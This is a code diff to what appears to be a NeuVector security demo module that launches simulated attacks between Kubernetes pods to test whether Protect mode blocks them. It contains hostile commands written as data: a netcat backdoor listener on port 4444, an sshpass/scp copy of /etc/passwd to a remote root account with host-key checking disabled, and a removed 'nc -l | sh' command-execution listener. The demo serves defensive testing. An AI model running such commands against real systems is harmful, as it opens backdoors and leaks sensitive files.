@@ -119,43 +119,25 @@ class AttackSimulationDemo(DemoModule):
             yield "[INFO] Simulating DoS attack with oversized ICMP packets (40KB payload)"
         elif attack_type == "nc_backdoor":
             # Netcat backdoor listener - will be blocked in Protect mode
-            cmd_args = ["nc", "-l", "-w", "5", "4444"]
-            yield "[INFO] Attempting to start netcat backdoor listener on port 4444 (5s timeout)"
+            # Use timeout command since nc -w doesn't work reliably in listen mode
+            cmd_args = ["timeout", "5", "nc", "-l", "-p", "4444"]
+            yield "[INFO] Opening backdoor listener on port 4444..."
+            yield "[INFO] Any attacker connecting would get shell access"
         elif attack_type == "scp_transfer":
             # File transfer of sensitive data using sshpass for non-interactive auth
-            cmd_args = ["sshpass", "-p", "demo123", "scp",
+            # -v for verbose output to show transfer success
+            cmd_args = ["sshpass", "-p", "demo123", "scp", "-v",
                        "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
                        "/etc/passwd", f"root@{target_addr}:/tmp/"]
             yield "[INFO] Attempting to transfer sensitive file (/etc/passwd)"
         elif attack_type == "reverse_shell":
-            # Reverse shell: start listener on target, connect from source
-            # When connection succeeds, execute hostname -f on target
-            yield "[INFO] Step 1: Starting command listener on cible1:4444..."
-
-            # Start listener on cible1 that will execute received commands
-            # It listens, receives a command, executes it, and stores output
-            listener_cmd = ["sh", "-c", "rm -f /tmp/shell_output; (nc -l -p 4444 -w 10 | sh > /tmp/shell_output 2>&1) & echo $!"]
-            try:
-                stdout, stderr, rc = await kubectl.run(
-                    "exec", "cible1", "--", *listener_cmd,
-                    namespace=NAMESPACE,
-                    check=False,
-                )
-                if rc == 0:
-                    yield f"[INFO] Listener started on cible1 (PID: {stdout.strip()})"
-                else:
-                    yield f"[WARNING] Failed to start listener: {stderr}"
-            except Exception as e:
-                yield f"[WARNING] Failed to start listener: {e}"
-
-            # Small delay to ensure listener is ready
-            await asyncio.sleep(1)
-
-            yield "[INFO] Step 2: Sending remote command from espion1..."
-            # Send hostname -f command to the listener
-            # Note: nc may return exit code 1 after connection closes (normal)
-            cmd_args = ["sh", "-c", f"echo 'hostname -f' | nc -w 3 {target_addr} 4444 || true"]
-            yield "[INFO] Sending 'hostname -f' command to cible1 via netcat"
+            # Reverse shell simulation: connect to SSH and get banner
+            yield "[INFO] Attempting reverse shell connection to cible1..."
+            yield "[INFO] This simulates connecting to a remote shell service"
+            # Connect to SSH port with netcat and get the banner (first line only)
+            # In Protect mode, nc will be blocked by process profile
+            cmd_args = ["sh", "-c", f"nc -w 2 {target_addr} 22 </dev/null 2>/dev/null | head -1"]
+            yield f"[INFO] Connecting to {target_addr}:22 via netcat"
         else:
             yield f"[ERROR] Unknown attack type: {attack_type}"
             return
@@ -167,33 +149,40 @@ class AttackSimulationDemo(DemoModule):
         process_killed = False
         command_success = False
         permission_denied = False
+        timeout_exit = False
 
         try:
             async for line in kubectl.exec_in_pod(
                 pod_name=pod_name,
                 command=cmd_args,
                 namespace=NAMESPACE,
-                timeout=30,
+                timeout=15,
             ):
                 yield line
                 # Check for various blocking/error indicators
                 lower_line = line.lower()
-                # Only exit code 137 (SIGKILL) indicates NeuVector block
+                # Exit code 137 (SIGKILL) indicates NeuVector block
                 if 'exit code 137' in lower_line:
                     process_killed = True
-                if 'permission denied' in lower_line or 'operation not permitted' in lower_line:
-                    permission_denied = True
-                if 'not found' in lower_line or 'no such file' in lower_line:
-                    permission_denied = True
+                # Exit code 124 indicates timeout command worked (nc ran successfully)
+                if 'exit code 124' in lower_line:
+                    timeout_exit = True
+                # Check for permission/blocking indicators (but not SSH debug messages)
+                if not lower_line.startswith('debug1:'):
+                    if 'permission denied' in lower_line or 'operation not permitted' in lower_line:
+                        permission_denied = True
+                    if ('not found' in lower_line or 'no such file' in lower_line) and 'command' in lower_line:
+                        permission_denied = True
                 # Check for success indicators based on attack type
                 if attack_type == "dos_ping":
                     if 'bytes from' in lower_line or 'time=' in lower_line:
                         command_success = True
                 elif attack_type == "nc_backdoor":
-                    if 'listening' in lower_line:
-                        command_success = True
+                    # nc backdoor success if it ran without being killed
+                    pass  # Will check timeout_exit after
                 elif attack_type == "scp_transfer":
-                    if '100%' in line:
+                    # Check for transfer success indicators
+                    if 'transferred:' in lower_line or 'exit status 0' in lower_line:
                         command_success = True
                 elif attack_type == "reverse_shell":
                     # nc exits cleanly if connection was made
@@ -203,43 +192,37 @@ class AttackSimulationDemo(DemoModule):
             # Exit code 137 = SIGKILL (NeuVector Protect mode)
             if 'exit code 137' in error_str:
                 process_killed = True
+            # Exit code 124 = timeout command worked (process ran successfully then timed out)
+            elif 'exit code 124' in error_str:
+                timeout_exit = True
             # Exit code 126/127 = permission denied or command not found
             elif 'exit code 126' in error_str or 'exit code 127' in error_str:
                 permission_denied = True
-            yield f"[ERROR] {str(e)}"
+            else:
+                yield f"[ERROR] {str(e)}"
 
         yield ""
 
-        # For reverse shell, check if command was executed on target
+        # For nc_backdoor, timeout exit means it ran successfully (not blocked)
+        if attack_type == "nc_backdoor" and timeout_exit:
+            yield "[INFO] Backdoor was active for 5 seconds on port 4444"
+            yield "[INFO] During this time, any attacker could connect and execute commands"
+            command_success = True
+
+        # For reverse_shell, if nc ran without being killed, consider it a success
         if attack_type == "reverse_shell" and not process_killed and not permission_denied:
-            await asyncio.sleep(2)  # Wait for command execution
-            yield "[INFO] Step 3: Checking result on cible1..."
-            try:
-                stdout, stderr, rc = await kubectl.run(
-                    "exec", "cible1", "--", "cat", "/tmp/shell_output",
-                    namespace=NAMESPACE,
-                    check=False,
-                )
-                if rc == 0 and stdout.strip():
-                    yield f"[SUCCESS] Remote command executed! Hostname: {stdout.strip()}"
-                    command_success = True
-                else:
-                    yield "[INFO] No output received (connection may have failed)"
-            except Exception as e:
-                yield f"[INFO] Could not verify result: {e}"
+            command_success = True
 
         yield ""
 
         # Report results
         if process_killed:
-            yield f"[BLOCKED] Attack '{attack_label}' was blocked by NeuVector!"
+            yield f"[OK] Attack '{attack_label}' was blocked by NeuVector!"
             yield "[INFO] Process was killed (exit code 137 - SIGKILL)"
             yield "[INFO] This indicates the process profile is in Protect mode"
-            raise Exception("Attack blocked by NeuVector")
         elif permission_denied:
-            yield f"[BLOCKED] Attack '{attack_label}' failed - permission denied or command not found"
+            yield f"[OK] Attack '{attack_label}' failed - permission denied or command not found"
             yield "[INFO] This may indicate process profile blocking or missing binary"
-            raise Exception("Attack blocked - permission denied")
         elif command_success:
             yield f"[WARNING] Attack '{attack_label}' succeeded!"
             yield "[INFO] Consider switching to Protect mode to block this attack"
